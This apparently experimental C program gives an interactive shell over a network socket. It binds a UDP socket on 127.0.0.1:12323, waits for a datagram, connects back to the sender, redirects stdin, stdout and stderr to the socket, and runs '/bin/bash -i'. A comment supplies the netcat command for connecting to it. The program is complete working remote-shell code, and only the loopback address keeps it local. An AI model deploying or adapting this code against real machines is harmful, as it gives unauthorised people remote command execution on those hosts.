/* Attempt to redirect stdin/stdout/stderr to  a network socket (and fork a
 child process, like a shell).
Using terminal, run command:
	stty -icanon -echo && nc -cu 127.0.0.1 12323 && stty icanon echo
stty prevent weird formatting during reverse shell
*/

#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main(int argc, char *argv[]){
	int sock = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0); // Shows up with `ss -au` as unconnected socket
	if(sock == -1){
		perror("Socket creation failed");
		return -1;
	}

	int res;

	// Setup peer information
	struct sockaddr_in peer;
	socklen_t peer_len = sizeof(peer);
	peer.sin_family = AF_INET;
	peer.sin_port = htons(12323);
	res = inet_pton(AF_INET, "127.0.0.1", &peer.sin_addr);
	//peer.sin_addr.s_addr = INADDR_LOOPBACK;

	// Connect socket
	/*res = connect(sock, (struct sockaddr*) &peer, sizeof(peer));
	if(res == -1){
		perror("connect failed");
		close(sock);
		return -1;
	}*/

	// Bind
	res = bind(sock, (struct sockaddr*) &peer, sizeof(peer));
	if(res == -1){
		perror("bind failed");
		close(sock);
		return -1;
	}

	// Wait for message to be sent
	const size_t msg_len = 64;
	char msg[msg_len];
	ssize_t count = recvfrom(sock, msg, msg_len, 0, (struct sockaddr*)&peer, &peer_len);
	if(count == -1){
		perror("recv failed");
		close(sock);
		return -1;
	}
	printf("Received\n");

	inet_ntop(AF_INET, &peer.sin_addr, msg, msg_len);
	printf("Connection from: %s:%d\n", msg, ntohs(peer.sin_port));

	// Set peer to where message was received from
	res = connect(sock, (struct sockaddr*) &peer, sizeof(peer));
	if(res == -1){
		perror("connect failed");
		close(sock);
		return -1;
	}

	// Do fork stuff
	pid_t proc = fork();
	if(proc == 0){
		// Child stuff
		printf("Child duping stuff..\n");

		// Setup stdin/out/err before exec
		res = dup2(sock, 0); // Dup stdin
		if(res == -1){
			perror("dup stdin failed");
			close(sock);
			return -1;
		}
		res = dup2(sock, 1); // Dup stdout
		if(res == -1){
			perror("dup stdout failed");
			close(sock);
			return -1;
		}
		res = dup2(sock, 2); // Dup stderr
		if(res == -1){
			perror("dup stderr failed");
			close(sock);
			return -1;
		}

		// Do  exec thing
		chdir("/");
		char *args[] = {"/bin/bash", "-i", NULL};
		execve(args[0], args, NULL);
		return -1;
	}

	// Parent stuff
	if(proc == -1){
		perror("Fork failed");
	}

	printf("Child process is %ld\n", proc);

	// Cleanup stuff
	close(sock);

	return 0;
}
